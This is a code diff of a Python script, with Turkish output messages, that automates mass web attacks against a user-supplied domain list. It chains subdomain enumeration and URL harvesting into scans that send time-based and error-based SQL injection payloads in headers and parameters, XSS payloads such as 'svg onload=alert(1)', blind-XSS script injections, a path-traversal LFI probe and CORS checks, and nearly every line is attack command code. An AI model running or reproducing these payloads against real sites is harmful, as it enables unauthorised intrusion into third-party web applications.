@@ -2,6 +2,9 @@ from termcolor import colored
 import subprocess
 import threading
 
+
+file_lock = threading.Lock()
+
 def run_command(command, output_file=None):
     result = subprocess.run(command, shell=True, text=True, capture_output=True)
     if output_file:
@@ -27,73 +30,48 @@ def print_banner():
     """
     print(banner)
 
-def run_threaded_command(cmd, output_file):
-    result = run_command(cmd, output_file)
-    print(f"Komut çıktısı {output_file} dosyasına kaydedildi.")
-
 def main():
     print_banner()
 
-    
     domains_file = get_user_input("Lütfen domain listesini içeren txt dosyasının adını girin: ")
+    output_file = 'output.txt'
+    all_results_file = 'all_results.txt'
 
-    # Subdomains bulma
-    print(colored("Subdomains bulunuyor...", "cyan"))
-    subdomains_command = f'subfinder -dL {domains_file} -silent -all | sort -u > subdomains.txt'
-    run_command(subdomains_command)
-    print(colored("Subdomains bulma tamamlandı. Bulunan subdomainler subdomains.txt dosyasına kaydedildi.\n", "green"))
+   
+    commands = [
+        {'cmd': f'subfinder -dL {domains_file} -o subs.txt', 'type': 'Subdomain Taraması'},
+        {'cmd': f'cat subs.txt | waybackurls | grep "\\\\?" | uro | httpx -silent > parameters.txt', 'type': 'Parameters Extraction'},
+        {'cmd': f'cat parameters.txt | httpx -threads 50 -silent -o parameters_http.txt && cat parameters_http.txt | grep ".php" | sed \'s/\.php.*/.php\\//\' | sort -u | sed s/$/%27%22%60/ | parallel -j50 "httpx -silent {{}} -ms \'You have an error in your SQL syntax\'"', 'type': 'SQL Enjeksiyonu Taraması 2'},
+        {'cmd': f'cat parameters.txt | httpx -silent -H "X-Forwarded-For: \'XOR(if (now()=sysdate(), sleep (13),0))OR" -rt -timeout 20 -mrt \'>13\' -o sql1.txt', 'type': 'SQL Enjeksiyonu Taraması 3'},
+        {'cmd': f'cat subs.txt | httpx -silent -o public.txt && cat public.txt | grep -E "/api/index.php/v1/config/application?public=true" | httpx -silent -mc 200', 'type': 'HTTP API Kontrolü'},
+        {'cmd': f'httpx -l subs.txt -path "/assets/built%2F..%2F..%2F/package.json" -status-code -mc 200 -o lfi.txt', 'type': 'LFI Kontrolü'},
+        {'cmd': f'cat subs.txt | httpx -silent | waybackurls | gau | bxss -payload \'<script src=https://google.com ></script>\' -header "X-Forwarder-For"', 'type': 'Blind XSS Kontrolü'},
+        {'cmd': f'cat parameters.txt | httpx -silent -H "X-Forwarded-For: \'1;SELECT IF((8303>8302),SLEEP(9),2356)#" -rt -timeout 20 -mrt \'>13\' -o sql2.txt', 'type': 'SQL Enjeksiyonu Taraması 4'},
+        {'cmd': f'cat parameters.txt | httpx -silent -H "X-Forwarded-For: \';%20waitfor%20delay%20\'0:0:6\'%20--%20" -rt -timeout 20 -mrt \'>13\' -o sql3.txt', 'type': 'SQL Enjeksiyonu Taraması 5'},
+        {'cmd': f'cat parameters.txt | grep -v -e js -e css -e svg -e png -e jpg -e eot -e ttf -e woff | httpx -mc 200 -silent > parameters_http.txt && cat parameters_http.txt | parallel -j50 "httpx --silent -H \"X-Forwarded-For: \'XOR(if (now()=sysdate(), sleep (13),0))OR\" -rt -timeout 20 -mrt \'>13\' -o sql4.txt"', 'type': 'SQL Enjeksiyonu Taraması 6'},
+        {'cmd': f'httpx -l parameters.txt -silent -no-color -threads 300 -location 301,302 | awk \'{{print $2}}\' | grep -Eo "(http|https)://[^/\"]*" | tr -d \'[]\' | parallel -j50 "gospider -d 0 -s {{}}" | tr \' \' \'\\n\' | grep -Eo \'(http|https)://[^/\"]*\' | grep "=" | qsreplace "<svg onload=alert(1)>";', 'type': 'XSS Kontrolü'},
+        {'cmd': f'cat parameters.txt| grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)"> blindsqli.txt', 'type': 'Blind SQL Enjeksiyonu Taraması'},
+        {'cmd': f'cat blindsqli.txt| parallel -j50 -q curl -o /dev/null -s -w %{{6}}\\n', 'type': 'Blind SQL Enjeksiyonu Taraması 2'},
+        {'cmd': f'nuclei -l parameters.txt -t fuzzing-templates -o FUZZRapor.txt', 'type': 'Fuzzing Kontrolü'},
+        {'cmd': f'cat subs.txt | httpx -threads 50 -silent -o httpx_results.txt', 'type': 'HTTP Taraması 2'},
+        {'cmd': f'cat httpx_results.txt | nuclei -t nuclei-templates -o WebRapor.txt', 'type': 'Web Kontrolü'},
+        {'cmd': f'cat {domains_file} | while read url; do target=$(curl -s -I -H "Origin: https://google.com" -X GET "$url"); if echo "$target" | grep -q \'https://google.com\'; then echo "[Potential CORS Found] $url" >> cors_check_results.txt; else echo "Nothing on $url" >> cors_check_results.txt; fi; done', 'type': 'CORS Kontrolü'},
+        {'cmd': f'gospider -S httpx_results.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk \'{{print $5}}\' | grep "=" | qsreplace -a | dalfox pipe | tee result.txt', 'type': 'Gospider Kontrolü'},
 
-    
-    subdomains_file = 'subdomains.txt'
-    try:
-        with open(subdomains_file, 'r') as sub_file:
-            subdomains = [line.strip() for line in sub_file.readlines() if line.strip()]
-    except FileNotFoundError:
-        print(colored(f"{subdomains_file} bulunamadı. Subdomain listesini oluşturun.", "red"))
-        return
-
-    print(colored(f"\nToplam {len(subdomains)} subdomain bulundu.\n", "green"))
+    ]
 
     print(colored("\nÇeşitli güvenlik kontrolleri başlatılıyor...\n", "yellow"))
 
-    
-    gospider_command = (
-        f'gospider -S command5_output.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" '
-        f'--other-source | grep -e "code-200" | awk \'{{print $5}}\' | grep "=" | qsreplace -a | dalfox pipe'
-    )
+    with open(all_results_file, 'w') as result_file:
+        for command in commands:
+            cmd = command['cmd']
+            scan_type = command['type']
+            result = run_command(cmd, output_file)
+            result_file.write(f"\nResult for {scan_type}:\n" + "=" * 50 + '\n')
+            result_file.write(result + '\n')
+            print(f"{scan_type} taraması için komut çıktısı {output_file} dosyasına ve 'all_results.txt' dosyasına kaydedildi.")
 
-    
-    gf_xss_command = (
-        f'cat parameters.txt | while read host; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>" && echo "$host Vulnerable"; done '
-    )
-
-    http_code_command = 'curl -o /dev/null -s -w %{http_code}'
-
-    commands = [
-        (f'cat subdomains.txt | waybackurls | grep "?" | uro | httpx -silent > parameters.txt', 'command5_output.txt'),
-        (gf_xss_command, 'xss_results.txt'),
-        (f'httpx -l parameters.txt -path "api/index.php/v1/config/application?public=true" -mc 200', 'INF.txt'),
-        (f'cat parameters.txt | waybackurls | gau | bxss -payload \'<script src=https://google.com ></script>\' -header "X-Forwarder-For"', 'XSS_output.txt'),
-        (f'httpx -l subdomains.txt --status-code -path /WEB-INF/classes/argo.properties', 'WEB-INF.txt'),
-        (f'cat parameters.txt | waybackurls | gau | bxss -payload \'<script src=https://google.com ></script>\' -header "X-Forwarder-For"', 'XSS1_output.txt'),
-        (f'nuclei -l parameters.txt -t fuzzing-templates -o nuclei_results.txt', 'fuzzing_results.txt'),
-        (f'echo parameters.txt | httpx -silent -H "X-Forwarded-For: \'XOR(if (now()=sysdate(), sleep (13),0))OR" -rt -timeout 20 -mrt \'>13\'', 'time_based_sql_output.txt'),
-        (f'cat parameters.txt | grep ".php" | sed \'s/\.php.*/.php\\//\' | sort -u | sed s/$/%27%22%60/ | httpx -silent -ms "You have an error in your SQL syntax" > SQL_syntax.txt', 'SQL_syntax.txt'),
-        (f'cat command5_output.txt | grep "=" | qsreplace "1 AND (SELECT 5230 FROM (SELECT(SLEEP(10)))SUmc)" > blindsqli.txt', 'blind_sqli_output.txt'),
-        (f'cat blindsqli.txt | parallel -j50 -q "{http_code_command}\\\n"', 'blind_sqli_output.txt'),
-        (gospider_command, 'gospider_results.txt')
-    ]
-
-    print(colored("Blind SQL taraması yapılıyor...\n", "cyan"))
-
-    for cmd, output_file in commands:
-        print(colored(f"Komut çalışıyor: {cmd}", "yellow"))
-        thread = threading.Thread(target=run_threaded_command, args=(cmd, output_file))
-        thread.start()
-        thread.join()
-        print(colored(f"Komut tamamlandı: {cmd}", "green"))
-
-    print(colored("\nTüm işlemler tamamlandı.", "green"))
+    print(colored("\nTüm işlemler tamamlandı. Sonuçlar 'all_results.txt' dosyasına kaydedildi.", "green"))
 
 if __name__ == "__main__":
     main()
